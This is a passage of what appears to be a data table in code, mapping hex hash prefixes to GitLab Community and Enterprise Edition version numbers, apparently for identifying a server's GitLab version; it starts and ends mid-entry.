'gitlab-ee:11.11.4,11.11.5,11.11.7,11.11.8', 'bd478f9681c28a19d424': 'gitlab-ce:10.4.0', '0bf18d06009d8c26c8eb': 'gitlab-ee:12.7.8,12.7.9', 'c327f68685b74583845d': 'gitlab-ce:13.5.1', '1db97d739bc18192e3dd': 'gitlab-ee:11.3.1', 'dbcae02d83f78d6a2dc7': 'gitlab-ee:13.6.6,13.6.7', 'd4b22e27bcff3e9f8297': 'gitlab-ee:10.6.5', 'a0eea1a7adb510d4528d': 'gitlab-ce:9.2.0', '76a669fbdba0dcaa0570': 'gitlab-ee:11.7.0', '45b860ac2482f3a8f9fc': 'gitlab-ce:10.5.0,10.5.1', '61085e1c4a43e155ed0b': 'gitlab-ee:10.6.6', '3c09e82ba9c703dca63f': 'gitlab-ee:9.2.2', '2e730199dabd73a9fd42': 'gitlab-ee:12.1.4,12.1.6', '8ee67c4aab5b94bf8a1d': 'gitlab-ee:14.0.5', 'f965d9d92177d6bc4799': 'gitlab-ce:13.0.0', '3888ff9e576fb9b44f1a': 'gitlab-ee:13.10.5', '8a07de65a98e22620346': 'gitlab-ee:11.2.7,11.2.8', '04eb4b96ba73c4add5fb': 'gitlab-ce:13.7.3,13.7.4', '55d3ae286e625a2dd2dc': 'gitlab-ee:11.3.0', '5f9673e4f7b28c674bb5': 'gitlab-ce:13.8.0,13.8.1', 'd3b5a874ddeb9e8c4909': 'gitlab-ee:13.2.1', '0ee89562957c3b844752': 'gitlab-ce:13.3.4', 'b8886235228a03aba343': 'gitlab-ce:13.3.5,13.3.6,13.3.7,13.3.8', '1f26e2bcf01f916359be': 'gitlab-ee:9.5.1,9.5.2', 'd677104c4442b6dc08ff': 'gitlab-ee:10.0.3', '4ccc09c89530820dfb29': 'gitlab-ce:10.0.7', 'd6040dbf29b9aec13c52': 'gitlab-ce:12.9.10,12.9.8,12.9.9', '60bde3c749532d5d6244': 'gitlab-ce:13.1.10,13.1.11', '0f57e0adf896561cb8a5': 'gitlab-ee:10.0.4', '18be6a306c740d6c87ce': 'gitlab-ee:10.3.0', 'f20954fae6f4eabf42c9': 'gitlab-ce:11.0.6', '7b490ba06ee0ed11f4cf': 'gitlab-ce:9.4.7', 'f5ca76b6507323647c9a': 'gitlab-ee:10.7.1', 'a7071d3a3ab911b28444': 'gitlab-ee:9.4.5', '1e4b1a7e2c92a2d7ccd8': 'gitlab-ce:9.3.3,9.3.4', 'c9795c27e34bcb0ace00': 'gitlab-ee:11.11.0', '329053c1c5f9599ed76a': 'gitlab-ee:11.10.5', '57be36db00242d9b6e00': 'gitlab-ce:11.7.5', '6c94ffdb6636aa364e0a': 'gitlab-ee:11.4.5', '3fd9f68cd2dadcff10e7': 'gitlab-ee:12.10.7,12.10.8,12.10.9', '2298070445002138e375': 'gitlab-ee:12.10.10,12.10.11,12.10.12', '0e3746858bb25a05a572': 'gitlab-ce:11.7.3', 'da92db7adc23fa49e54b': 'gitlab-ce:12.2.3', '6296cf4ec72df3ee3910': 'gitlab-ee:11.7.3', 'b9edfdcd25aca1714a0c': 'gitlab-ce:12.0.0,12.0.1,12.0.2,12.0.3,12.0.4,12.0.6', '8581c734d9db5fba7c12': 'gitlab-ee:12.8.10,12.8.8,12.8.9', '96567f0814bcf6bdc6e7': 'gitlab-ee:11.6.5', '713c5579a7ab27935370': 'gitlab-ee:11.7.4', '69496dbc5da2e2da2e38': 'gitlab-ce:11.4.0', '8c4b9021880e82534956': 'gitlab-ee:9.4.1', '770898c00ccf25dade07': 'gitlab-ce:12.2.1', '611cbe4b65ee48d4477b': 'gitlab-ee:13.5.2', '4f00d34b742f6ca6b4c9': 'gitlab-ce:13.8.5,13.8.6,13.8.7,13.8.8', '9ae7857784103a928459': 'gitlab-ee:9.0.3,9.0.4', 'dd27861b27acdf7d6d5a': 'gitlab-ce:10.1.5', 'cb5ad49a7b3ead484f78': 'gitlab-ce:11.6.1', '745a84f132170c95b546': 'gitlab-ce:13.1.1', 'c2b8972e6e2a17fc96b7': 'gitlab-ee:14.1.2', '46a5b7283d15b5d027b1': 'gitlab-ce:14.1.7', '06eaab4d1739bff64ef8': 'gitlab-ce:12.7.7', '78225279c3ce10b49fcd': 'gitlab-ee:12.7.7', 'b6e167ed0a5918b43191': 'gitlab-ce:11.5.6,11.5.7', 'adfe78d0aefbab620433': 'gitlab-ee:12.2.6,12.2.7,12.2.8', '38079830b091db499557': 'gitlab-ce:10.1.0', '2ba47845e121cd4d3a3d': 'gitlab-ee:12.8.1', 'd6d067330798d959ae88': 'gitlab-ce:9.5.1,9.5.2', 'd51c2c492dc12f1b3166': 'gitlab-ee:12.10.0', '9bea2f7be47dddf76336': 'gitlab-ce:11.2.2,11.2.3', 'fb4620281ae4e0256a28': 'gitlab-ee:11.2.2,11.2.3', '14c541adf6cecee03dfc': 'gitlab-ce:9.3.10,9.3.6,9.3.7,9.3.8,9.3.9', 'd8a3fb15d9634390587b': 'gitlab-ce:10.0.0,10.0.1', 'a398a7c81b03d11b77cd': 'gitlab-ce:9.4.2,9.4.3,9.4.4', 'b8516bf1fc26cafe7094': 'gitlab-ce:13.10.4', '1e9b3359158067c96acf': 'gitlab-ee:11.9.6,11.9.7,11.9.8,11.9.9', '9159680a5fe09531a670': 'gitlab-ee:9.5.8', '0cf4960a989f1f3f7cd5': 'gitlab-ce:9.3.2', '4f17305e2f7c40cbe427': 'gitlab-ce:10.1.6,10.1.7', '1ac488145e09bf290e9c': 'gitlab-ee:13.7.3,13.7.4', 'ee201aa2048442f0f571': 'gitlab-ee:10.4.1', '6a58a819d89475283be3': 'gitlab-ee:9.5.4', 'b5a432700edaacaed532': 'gitlab-ee:11.0.5', '67d7515ea6b7b81c810b': 'gitlab-ce:12.4.0,12.4.1', '1e7b7a19e7fc6a402fde': 'gitlab-ce:10.1.4', 'f2a7a40810eda3543fc1': 'gitlab-ce:8.17.3', '2fee7cb6c82e73909c1d': 'gitlab-ee:10.3.6', '82f0ad367971194ea7ca': 'gitlab-ee:12.5.0', 'fe0f2ce66b78d23cf71c': 'gitlab-ee:8.17.3', '2d7dad0841b9c8ac2f3c': 'gitlab-ce:11.10.4,11.10.5', '2a0d7614b0081b46aa48': 'gitlab-ce:12.1.0,12.1.1,12.1.2', '2fdc0a56d6a5e2d7e26c': 'gitlab-ce:12.2.12,12.2.9', 'c5c55d778023c5386e39': 'gitlab-ce:11.1.6', 'a4fa1660d82c72de65fb': 'gitlab-ee:11.2.4,11.2.5', '941b6c745d8eb033c900': 'gitlab-ce:11.1.0,11.1.1', '1473b342b66217f47bdf': 'gitlab-ee:13.2.3,13.2.4,13.2.5,13.2.6,13.2.7', '2691ef2c40d268c6064c': 'gitlab-ee:9.4.0', 'cbf23b9150dbe943006d': 'gitlab-ee:13.9.0', '71270dfc259b212bd43f': 'gitlab-ee:11.8.1', '804f4c40c1a04bd98041': 'gitlab-ce:10.4.1', '2e05391d886be053423b': 'gitlab-ee:9.1.10,9.1.4,9.1.5,9.1.6,9.1.7,9.1.8,9.1.9', '5aa6cbe10128e1752346': 'gitlab-ee:11.7.5', 'cb6c441a23a63bd4df8d': 'gitlab-ce:11.4.13,11.4.14', 'da7c281cae020b982b0e': 'gitlab-ee:12.10.1,12.10.2', '50b18acefcff7ea3f88b': 'gitlab-ce:13.4.6', '357494e60d0fa95a049d': 'gitlab-ce:11.4.5', 'b5958f38de8bb770a427': 'gitlab-ce:13.11.0', '1bc6ff6ddbae9c73db6c': 'gitlab-ce:12.8.2', '6dd70427ca11f0d187b7': 'gitlab-ee:11.3.5,11.3.6', '27ee7b6d923fff92df79': 'gitlab-ce:11.6.5', '639f474c96dc01595843': 'gitlab-ce:13.0.10,13.0.12,13.0.8,13.0.9', '02f3aa18525a0a00b156': 'gitlab-ee:13.0.10,13.0.8,13.0.9', '3404b07279d6b61fc258': 'gitlab-ce:8.17.2', '12920a0cf6d30b69ad25': 'gitlab-ee:11.0.2', 'b49a43faa0ccc0abb9d7': 'gitlab-ce:13.10.0,13.10.1', '780f930d55a0bc2d63e6': 'gitlab-ee:13.8.2,13.8.3,13.8.4', '2e2fb73c797ef01cc4e8': 'gitlab-ce:12.8.1', 'f3251b97b88a3d5af409': 'gitlab-ce:10.4.7', 'acbf99bd66c37c0d469a': 'gitlab-ce:13.5.3', 'c27c6c5f75b15ff20b3a': 'gitlab-ee:13.3.0,13.3.1', '910ff53c2adb9645f033': 'gitlab-ee:12.5.1,12.5.2', 'a5d87ba54ff2241ad449': 'gitlab-ee:11.11.3', '4f63918d59feb65252f5': 'gitlab-ee:9.3.5', '670e4558a58a83bc79c3': 'gitlab-ce:11.7.4', '9fe06a5a29af49022519': 'gitlab-ce:12.10.0', '1c7b8def2bcdb43a14e8': 'gitlab-ee:10.5.8', '5ad20937684505080145': 'gitlab-ce:13.4.7', '88f25d9ffb77350f7bb8': 'gitlab-ee:13.10.0,13.10.1', '1ae3f4558570b45f0b46': 'gitlab-ee:11.10.1,11.10.2,11.10.3', 'ae144461abbf725b8ad3': 'gitlab-ee:11.4.10,11.4.11,11.4.12,11.4.8,11.4.9', 'bdfad00c5fa325f3a151': 'gitlab-ee:8.17.1', '44cafa18be1d9fd89d85': 'gitlab-ce:10.6.3', 'b74bc187c1171079f809': 'gitlab-ee:11.1.0,11.1.1', '0ccb1fee73207ef4f88b': 'gitlab-ce:9.5.5', '9e2d1921c3c6410258ba': 'gitlab-ee:13.12.2,13.12.3,13.12.4,13.12.5', '9cce48100a706a982524': 'gitlab-ce:13.6.0', '80adec399f32b3452eeb': 'gitlab-ce:10.8.7', '73554f53a666c6cbbcc9': 'gitlab-ee:10.7.3', '64245f60eedbf42f4b80': 'gitlab-ee:12.1.0,12.1.1,12.1.2', '8fc18db6f68340703dad': 'gitlab-ee:14.2.6', 'f7201fe2a464a34441a9': 'gitlab-ee:14.2.1,14.2.2', '9b78ce3d08b2ff5bdf46': 'gitlab-ce:14.1.0,14.1.1', '72a44972e01ad19285ee': 'gitlab-ce:11.10.6', '2454119e495efd7f45e8': 'gitlab-ce:10.0.4', 'f324c0cbb902a95bced3': 'gitlab-ee:12.2.3', '8a7193fe241497693f0e': 'gitlab-ee:11.6.8', '4cbaa7d70c2ab2f56fdd': 'gitlab-ee:9.0.10,9.0.11,9.0.12,9.0.13,9.0.7,9.0.9', '4244014a286fb646ff87': 'gitlab-ce:10.3.0,10.3.1,10.3.2,10.3.3', '53e80bf2b623c018416f': 'gitlab-ce:9.3.5', '0e435ad4a40e195461d2': 'gitlab-ee:12.7.4,12.7.5,12.7.6', '9c897e4944f560281319': 'gitlab-ee:14.0.3,14.0.4', '509faa54f01663e1a45d': 'gitlab-ee:10.5.2,10.5.3', '29ef5f37b56444925955': 'gitlab-ce:11.1.7,11.1.8', '553644b367be99a65e30': 'gitlab-ee:10.4.0', '1337f73f81b1f8c6446d': 'gitlab-ee:11.0.6', 'b28c4eb12bd74962f8c3': 'gitlab-ee:11.8.2,11.8.3', '0b2bc0565d38348040d9': 'gitlab-ce:14.3.3', '033d2169000ad78f17ac': 'gitlab-ce:11.0.2', 'f679875473d4039d1da5': 'gitlab-ee:13.3.4', '0a849c30886c1a0ce2e2': 'gitlab-ce:9.1.10,9.1.4,9.1.5,9.1.6,9.1.7,9.1.8,9.1.9', '3133bc82ee3218615825': 'gitlab-ee:11.9.1', '2360793a2467d0ce2d1f': 'gitlab-ee:13.4.5', '0e2609bc9105bb36fcc2': 'gitlab-ce:10.3.7,10.3.8,10.3.9', 'a64579e944da0c8a41ec': 'gitlab-ee:12.10.3,12.10.5,12.10.6', 'e305e72c24f3a7cd25a4': 'gitlab-ee:10.3.7,10.3.8,10.3.9', '34205dd7c909e69bd49b': 'gitlab-ee:12.1.3', '610336a669ddaebc3ddc': 'gitlab-ce:13.0.3,13.0.4,13.0.5,13.0.6,13.0.7', 'dcb279f89ca98d1d167b': 'gitlab-ee:9.3.4', 'af5ca69ff066bbc8c736': 'gitlab-ee:13.9.2,13.9.3,13.9.4,13.9.5,13.9.6', '29a7ce5ea8e6db4bff13': 'gitlab-ce:12.10.1,12.10.2', '972b2e02a438aff45f12': 'gitlab-ee:10.4.7', '1c76e5ed7c715ef9d10b': 'gitlab-ee:10.7.4', '106481def6f2098f78a1': 'gitlab-ee:10.0.5,10.0.6', 'a381c27b42a0e0be325d': 'gitlab-ee:13.6.3,13.6.4,13.6.5', '2a8248652e9591a14a4a': 'gitlab-ce:12.8.0', '5f3de1268cb4f3228d81': 'gitlab-ce:10.5.8', '6ac68a50a59485a4bd47': 'gitlab-ce:12.2.4,12.2.5', 'b965c847cc09dd86f24d': 'gitlab-ee:11.8.0', 'cd62a8c290ab55fd1bd6': 'gitlab-ee:12.1.17', '3f886fd62e2871621c51': 'gitlab-ce:12.5.3,12.5.4,12.5.5,12.5.6,12.5.7', '2976ae0b75d1924b7097': 'gitlab-ee:9.3.10,9.3.6,9.3.7,9.3.8,9.3.9', '84cac3a227cc9bb8d352': 'gitlab-ee:12.2.0', '2ecacdae558d2d2c280e': 'gitlab-ee:12.8.0', '287f4e77f36c8bfefb20': 'gitlab-ce:13.1.7,13.1.8,13.1.9', '1b844cd7373bbe7daaae': 'gitlab-ee:12.5.10,12.5.9', '0b20fcae7619f933befa': 'gitlab-ce:13.7.5', 'ae0dea2e6a4421316992': 'gitlab-ce:8.17.6,8.17.7,8.17.8', '0a73a93554807761e4cc': 'gitlab-ce:9.3.1', 'b348a9a8c3c1d8c631d2': 'gitlab-ee:11.9.4', 'a4363e74b255a4977bd7': 'gitlab-ee:8.17.4,8.17.5', 'b4a2f58144d288bdfa1c': 'gitlab-ce:10.5.2,10.5.3', '3bbf5e9a221bce6d4111': 'gitlab-ee:11.7.6,11.7.7', '527e4c54eb834d56fde0': 'gitlab-ee:11.5.6,11.5.7', '7c70a9b72d32292039fd': 'gitlab-ee:13.8.1', '08869d0956bdbfa38e58': 'gitlab-ce:14.2.0', 'fb363d9a83c6c1b671a8': 'gitlab-ce:9.0.5', 'e448ad0d2ca9cc0ac5b8': 'gitlab-ee:14.0.1', '574f099ee72dbe6b0ced': 'gitlab-ce:9.5.0', '66d111c1f917a9d09e16': 'gitlab-ee:10.5.0,10.5.1', 'c7a1c922a22391b3c091': 'gitlab-ce:10.2.5', '5449545f1e9da9a25940': 'gitlab-ce:13.10.2,13.10.3', 'bbb80152234da762016a': 'gitlab-ce:9.5.4', 'e8df2b4fde206d7d9703': 'gitlab-ce:14.3.1,14.3.2', '8419b3ba4be6e0dc5619': 'gitlab-ee:12.9.0', '2e4f0a5c5e7f44fae7f6': 'gitlab-ce:13.12.2,13.12.3,13.12.4,13.12.5', '350b08a260f8f3c064dc': 'gitlab-ce:14.0.5', 'b490d5b6f11099f930ce': 'gitlab-ee:9.3.1', 'b02bb6cb685b92e79838': 'gitlab-ee:9.2.10,9.2.7,9.2.8,9.2.9', '3c6bb9c7df8acc18d0d7': 'gitlab-ce:11.0.0,11.0.1', '3c526831b656a6d9a00c': 'gitlab-ee:12.7.0', '41e1a02f1d6d950b2807': 'gitlab-ee:12.8.2', 'cf5ad1bb59f3b6be5a31': 'gitlab-ce:12.10.3,12.10.5,12.10.6', '210976fd1a4fadc2a12c': 'gitlab-ee:10.5.7', '8c5e7b20d0f886519b3c': 'gitlab-ee:11.9.10,11.9.11', '721a2812021737baa1d5': 'gitlab-ee:10.3.4,10.3.5', '92643beff62755798491': 'gitlab-ce:11.10.0', '3dc52f008d4b86c267e1': 'gitlab-ce:11.6.9', '8f172df2c323172817a8': 'gitlab-ce:11.4.3,11.4.4', '6b1b04f0c9deb46340e1': 'gitlab-ce:9.2.6', '4aee333c2055f87198a4': 'gitlab-ce:9.1.0,9.1.1,9.1.2', 'dbe16a7eda5d59f26bfb': 'gitlab-ce:10.2.3', 'ab0e7e95f0e854e3f665': 'gitlab-ce:9.2.4,9.2.5', '7c314a5fcb3cc21e81a0': 'gitlab-ee:11.9.12', 'b6be20f5f9bd67f88a0f': 'gitlab-ce:11.5.2,11.5.3,11.5.4,11.5.5', '10e9bf20d006e19bc344': 'gitlab-ce:9.2.1', '5df49875b1117a04d06c': 'gitlab-ce:14.3.0', '358f672c208344332ec8': 'gitlab-ce:14.0.6', '3584b2208695087e93a4': 'gitlab-ce:12.5.0', '57532f8615919c45f89e': 'gitlab-ce:10.7.1', 'ebcc24a2528f0ea9834e': 'gitlab-ce:9.0.0', 'd3141d5c4c9bf41ab730': 'gitlab-ce:11.2.7,11.2.8', '44d5af221f1c528584dc': 'gitlab-ee:14.2.0', 'cc923a667f9c8788713a': 'gitlab-ce:10.7.3,10.7.4,10.7.5,10.7.6,10.7.7', '0f767eb6f90b1292725d': 'gitlab-ce:10.6.4', 'aab56d5d61006e2c4f06': 'gitlab-ce:12.3.7,12.3.8,12.3.9', '5424af9904b84d10f751': 'gitlab-ce:10.1.3', '0ef7415e289409ac5b21': 'gitlab-ce:11.3.10', '5108cc4e3ac2af93dcd7': 'gitlab-ee:14.0.0', '4b10bf74d5ba5e840798': 'gitlab-ce:11.8.1', 'e1eb485b71f87b750a39': 'gitlab-ee:12.3.7,12.3.8,12.3.9', '9e1f84d529c29838a818': 'gitlab-ee:10.6.4', '160c9e9ca72351ddf5c4': 'gitlab-ee:14.1.3,14.1.4,14.1.5,14.1.6', '3b571d7d1f349f7d0dbb': 'gitlab-ce:11.6.8', '33c132122ac56c31a59b': 'gitlab-ce:12.1.3,12.1.4,12.1.6', 'beac23a9af3ddd43fe7a': 'gitlab-ee:13.4.6', '501e0009eb193706ab21': 'gitlab-ce:12.1.11,12.1.8,12.1.9', 'ced00f8574d8f81c9759': 'gitlab-ce:13.2.1', '42544af69d84aa7fbc8c': 'gitlab-ce:12.1.12,12.1.13,12.1.14', 'efd81b42452d67118152': 'gitlab-ee:14.3.3', '6de7741cec9ab7826d5f': 'gitlab-ce:11.11.3', '3ca7b0a55053f7538ef0': 'gitlab-ce:13.3.0,13.3.1', '18a696548203fff9106c': 'gitlab-ee:9.2.3,9.2.4,9.2.5', '23387a7eaad5c6410484': 'gitlab-ce:12.7.2', 'cecc0cc390877fa75276': 'gitlab-ee:10.8.3,10.8.4,10.8.5,10.8.6', '44f76075498ed38a8742': 'gitlab-ee:8.17.6,8.17.7,8.17.8', '166b8859fe47d928e789': 'gitlab-ce:13.5.5,13.5.6,13.5.7', '71b89ad888202c76e5c9': 'gitlab-ee:9.2.0', 'f5af4d74b365f9bf567b': 'gitlab-ee:9.5.6,9.5.7', '9a754492dd90555ca3dd': 'gitlab-ee:9.5.5', 'c21efe070704289b6c55': 'gitlab-ce:10.3.4,10.3.5', 'f6d09bb32d51bbce02db': 'gitlab-ce:11.3.5,11.3.6', '61bfa43f9fb4116abd7f': 'gitlab-ee:13.4.1,13.4.2', '7085fd1d1befa4c549dd': 'gitlab-ee:11.6.0', 'ba57b98387ee424723b9': 'gitlab-ce:12.7.8,12.7.9', 'f249792cbf6dffd76e88': 'gitlab-ee:9.5.3', 'c5d8ab5a701f0778a74d': 'gitlab-ee:13.0.12,13.0.13,13.0.14', '678d000f0569e9c99a0a': 'gitlab-ee:9.4.7', '4acb317a59d20876f907': 'gitlab-ee:13.1.2,13.1.3', '81d7b793252877126df4': 'gitlab-ce:13.7.0,13.7.1,13.7.2', '5d278d6da52671da29ee': 'gitlab-ee:13.8.0', '642a321f00403e0c8400': 'gitlab-ee:9.2.6', '106ffb118b158e8b577a': 'gitlab-ce:13.2.4,13.2.5,13.2.6,13.2.7', 'c99cdb0969be4f0da0fc': 'gitlab-ee:13.11.0', '8d07d7fd07389c4cd403': 'gitlab-ee:10.1.4', '946e25ac96152ee42037': 'gitlab-ee:11.11.1,11.11.2', '6779c5c26004cdef9dbe': 'gitlab-ee:14.0.6', '50b1acc557734feafad9': 'gitlab-ce:11.7.6,11.7.7', '83baaba01ce2dffb286d': 'gitlab-ce:13.2.0', '1a7d8b021aef4c8e0e9b': 'gitlab-ee:11.7.10,11.7.11,11.7.12', '9b57394b4dd929713787': 'gitlab-ce:12.7.0', '012eb4c5de7d7e420bb5': 'gitlab-ee:14.1.7', '5cbc08b3e4827370079f': 'gitlab-ee:10.4.4,10.4.5,10.4.6', '54fd6eb654a74ed0794a': 'gitlab-ce:13.4.4', '7820accd42fb137e2c08': 'gitlab-ee:12.0.12,12.0.8,12.0.9', '37fa755ae908d8e2b743': 'gitlab-ce:10.0.2', '628217d9d243ab844ac4': 'gitlab-ee:10.6.0', 'd879f635d99b01660a52': 'gitlab-ce:11.5.10,11.5.11', 'f5934f39051d7dfba134': 'gitlab-ee:14.2.3,14.2.4', '9c5f00c44ae3caefc02e': 'gitlab-ce:13.3.9', '99d9e425f254524ad8ac': 'gitlab-ce:12.9.1,12.9.2,12.9.3', '4a996fd00928b5e20c08': 'gitlab-ce:11.10.1,11.10.2,11.10.3', '547403af54903a5effc0': 'gitlab-ce:12.2.6,12.2.7,12.2.8', '7f972b6af093c93ab7b8': 'gitlab-ce:10.4.3', 'f75bbb61dcafe004df55': 'gitlab-ce:11.4.6,11.4.7', '5813a74c5cb3461fb723': 'gitlab-ee:13.1.6,13.1.7,13.1.8,13.1.9', 'eda1474489f61ee4bea7': 'gitlab-ee:13.2.10,13.2.8,13.2.9', 'dceb595db940ed48486f': 'gitlab-ce:12.4.4,12.4.5,12.4.6,12.4.7,12.4.8', '43efb4910cfe25e5ec41': 'gitlab-ee:11.10.7,11.10.8', 'd77871d1c9d6f0ad46eb': 'gitlab-ee:10.8.0', '9929e90eac444bca7baf': 'gitlab-ee:13.5.4', '74ec7b78d2e1e787307e': 'gitlab-ee:13.0.1', 'd1a22dece9584fefa298': 'gitlab-ce:14.1.2,14.1.3,14.1.4,14.1.5,14.1.6', 'c3a338ef4a097af48d5f': 'gitlab-ce:11.10.7,11.10.8', 'e029cc1403581d179eb4': 'gitlab-ce:10.7.0', 'feb8ac93f4cd519f7b74': 'gitlab-ee:9.5.0', '36987894604114b89659': 'gitlab-ce:11.7.0', 'bb2f8670798f7b168aea': 'gitlab-ce:9.5.10,9.5.9', 'd82cb00d39d43a109c20': 'gitlab-ee:13.1.10,13.1.11', '07f31ac63f997f05ed88': 'gitlab-ee:12.9.10,12.9.8,12.9.9', 'e16093b3fa8d4dfcb7f1': 'gitlab-ce:13.6.6,13.6.7', 'a131ccca4742d65cc7c8': 'gitlab-ce:11.0.5', '37f15d1add4c81283440': 'gitlab-ee:9.4.2,9.4.3,9.4.4', '1ca2c636c594fe82bf56': 'gitlab-ce:11.2.4,11.2.5', '648db5972bf0c4d01204': 'gitlab-ee:13.11.1,13.11.2,13.11.3,13.11.4', '80ac6c940306abbf40f4': 'gitlab-ce:11.8.2,11.8.3', 'ca3e2a954495cefa4560': 'gitlab-ce:11.3.3,11.3.4', 'e606e589cfd00283243d': 'gitlab-ee:12.7.2', '70e95d96945ac6b116df': 'gitlab-ce:13.10.5', 'cc508781720881b7f734': 'gitlab-ee:14.3.2', 'fa2051e535b5d468e50b': 'gitlab-ee:12.9.2,12.9.3', '2049fe2d430650c71460': 'gitlab-ce:9.4.0', 'cf9ab010a484fb41f674': 'gitlab-ee:12.3.6', '7e1da6442d2055f08435': 'gitlab-ee:13.10.4', 'd9036dfe13b24443d785': 'gitlab-ee:13.7.8,13.7.9', '503ca1b16238be618bf4': 'gitlab-ce:10.6.5,10.6.6', '8285d779049273968838': 'gitlab-ee:12.2.12,12.2.9', '5da97d0d735d667d16ce': 'gitlab-ce:14.2.3,14.2.4', '1cb94ba8a99fd37f717d': 'gitlab-ee:10.8.1', '130b56192be1d80b4cbd': 'gitlab-ee:13.4.3', '0de1e45bd411cb834ba5': 'gitlab-ee:10.1.3', 'ee5853b8ee4e0bc5dd41': 'gitlab-ee:12.1.11,12.1.8,12.1.9', '5315913351938d1b23a1': 'gitlab-ce:12.7.4,12.7.5,12.7.6', '2f0c802bb92185c21103': 'gitlab-ee:13.7.5', 'e6ba80a46952a6c16174': 'gitlab-ee:13.12.10,13.12.11,13.12.12,13.12.9', '4609b7e979b6c9009788': 'gitlab-ee:10.4.3', '5813eb8693da59ff0841': 'gitlab-ce:9.5.8', '025f157da404339a9c7b': 'gitlab-ce:12.3.2,12.3.3,12.3.4,12.3.5', '95042a74fd2ec393495d': 'gitlab-ee:13.9.1', 'e98fdb2c980f721788c6': 'gitlab-ce:9.2.10,9.2.7,9.2.8,9.2.9', '212e0d5aa9a2d3a51757': 'gitlab-ce:13.11.5', '081c2571938dd458a7aa': 'gitlab-ee:11.0.3,11.0.4', 'cb33673c46de2f1007de': 'gitlab-ee:13.3.2,13.3.3', 'e7f82b26132cf2c8cfbc': 'gitlab-ce:13.1.2,13.1.3,13.1.4,13.1.5,13.1.6', '6bdcd98ef34512d3939c': 'gitlab-ce:13.5.2', '1739df9627dc4fb80595': 'gitlab-ee:11.4.13,11.4.14', '7909f26d68264418c7c5': 'gitlab-ce:13.9.2,13.9.3,13.9.4,13.9.5,13.9.6', '5bb7d410b4c93ad7c5ab': 'gitlab-ee:12.0.0,12.0.1', 'e714554e56ca340231be': 'gitlab-ee:11.0.0,11.0.1', '04a7f5f3870b6f39e85c': 'gitlab-ee:10.1.0', 'b5a47617861a7a8e462a': 'gitlab-ee:12.2.1', 'b965bdb5d866fc45b55d': 'gitlab-ee:9.3.11', '7078cefb7511b0b6b76b': 'gitlab-ee:13.3.6,13.3.7,13.3.8', '3c20f7378305186b3f3d': 'gitlab-ee:10.1.6,10.1.7', 'ad6d7ff474c1014090c9': 'gitlab-ee:9.4.6', 'e1e70cc562bf80739c3b': 'gitlab-ee:11.4.0', 'ed47566e9facd76f4aaa': 'gitlab-ee:13.0.3,13.0.4,13.0.5,13.0.6,13.0.7', 'd901a5d41079d7c7396b': 'gitlab-ce:12.4.2,12.4.3', 'c43a7068c3610a3c7e3e': 'gitlab-ee:11.8.10,11.8.8,11.8.9', '22de812373910f0bc00e': 'gitlab-ce:14.0.3,14.0.4', 'df0a9d7641c58f311bad': 'gitlab-ee:13.9.7', '35fc8c44bd461d78a912': 'gitlab-ce:14.2.6', '735e7997e4e8c754817b': 'gitlab-ce:11.6.10,11.6.11', '9fcecf859d07d168fae0': 'gitlab-ee:13.0.0', '384e8af9b8600f189bd4': 'gitlab-ee:14.0.10,14.0.11,14.0.12,14.0.8,14.0.9', '5b4c75fdc1b11701842c': 'gitlab-ee:11.10.6', '77af7230263c2fcb6604': 'gitlab-ee:13.10.2,13.10.3', '089df064522a3db89c72': 'gitlab-ee:10.5.4,10.5.5,10.5.6', '22a1b3acd211ee8cd6de': 'gitlab-ee:10.7.2', 'fd241a0fc16ea6d73251': 'gitlab-ee:12.6.0,12.6.1,12.6.2,12.6.3,12.6.4', '336d89b2fce2ef0d5988': 'gitlab-ce:8.17.1', '15d3fe09016988c71054': 'gitlab-ce:10.8.1,10.8.2', '3c8eec19d3f1ac95dbb7': 'gitlab-ce:11.5.1', 'd56024b86de2d0594747': 'gitlab-ce:13.11.1,13.11.2', 'bdc7e362e71a48fff678': 'gitlab-ee:11.5.1', 'c2a4aca3c1d4c85aff7e': 'gitlab-ee:13.2.2', 'ac7d7edb09babfd68fed': 'gitlab-ee:9.0.0', 'b67caf307ffa329b1fc5': 'gitlab-ce:12.2.0', '5a40b9fdbf741f7fcd6e': 'gitlab-ee:14.0.2', '576195e375ef7c4c8f65': 'gitlab-ee:12.3.2,12.3.3', '5c8af130cec9e511ece1': 'gitlab-ee:10.0.0,10.0.1', 'b80182009e358942eeef': 'gitlab-ee:12.3.4,12.3.5', 'fe923c5e0b6a8e70acec': 'gitlab-ee:10.7.0', '115475130651e41cfa85': 'gitlab-ee:11.10.4', 'cad92852d179e1c7e0f4': 'gitlab-ee:11.5.2,11.5.3,11.5.4,11.5.5', '17d31e96556327e11216': 'gitlab-ce:11.8.6,11.8.7', '702358cf2bb37bf1a127': 'gitlab-ce:10.2.4', 'b6845dc4fa21eaa5a7a6': 'gitlab-ce:14.2.1,14.2.2', '7344c61b3d57a00a7076': 'gitlab-ce:8.17.0', '5d4b59870d47e28f402e': 'gitlab-ce:10.8.3,10.8.4,10.8.5,10.8.6', '86112533e233a363c04f': 'gitlab-ee:14.3.4', '3607f9e278e03f25bb7e': 'gitlab-ce:9.5.6,9.5.7', '8903ba9503bbfb0a4b69': 'gitlab-ce:11.1.2', '3b9f73d36eecedcfa09e': 'gitlab-ee:10.8.2', 'b9dcc0f1e5de99c34da8': 'gitlab-ce:10.4.2', 'c3d908474f861434ea34': 'gitlab-ee:14.0.7', '9f4cd9b2c7ce6f3b32ed': 'gitlab-ce:14.0.0,14.0.1', 'a58e760c263ce457a2ff': 'gitlab-ee:11.6.2,11.6.3,11.6.4', '0c150549bb110fe3fa98': 'gitlab-ee:13.7.6,13.7.7', 'c0d4120f45bd7c957637': 'gitlab-ce:13.4.5', '02bb16d60cbc4c38dba3': 'gitlab-ee:9.2.1', '3be73f0e686cf6357ff9': 'gitlab-ce:9.4.1', 'b74c7a098526bd6e442e': 'gitlab-ee:13.7.0', '85724630376db8be1a3f': 'gitlab-ce:12.0.12,12.0.8,12.0.9', 'b3f74fcf7a94aa8fd0e0': 'gitlab-ce:9.3.0', 'fea70c983bd4bb950a59': 'gitlab-ce:14.3.4', '25931ced49555567dc55': 'gitlab-ee:10.1.1,10.1.2', '8994b6009115587ea326': 'gitlab-ee:11.10.0', '75cdd56ce4873d3ae586': 'gitlab-ce:13.7.6,13.7.7', '154a62ac46073b1ebee9': 'gitlab-ce:13.2.2,13.2.3', 'f8fed774b90576098c94': 'gitlab-ce:13.0.13,13.0.14', 'eaff05292dbb12ad6d31': 'gitlab-ce:10.2.2', '8a8ea90e88c20bd388df': 'gitlab-ee:10.2.4', '811a551d157f5cf3283d': 'gitlab-ee:11.5.0', 'f759e4ab23039521a343': 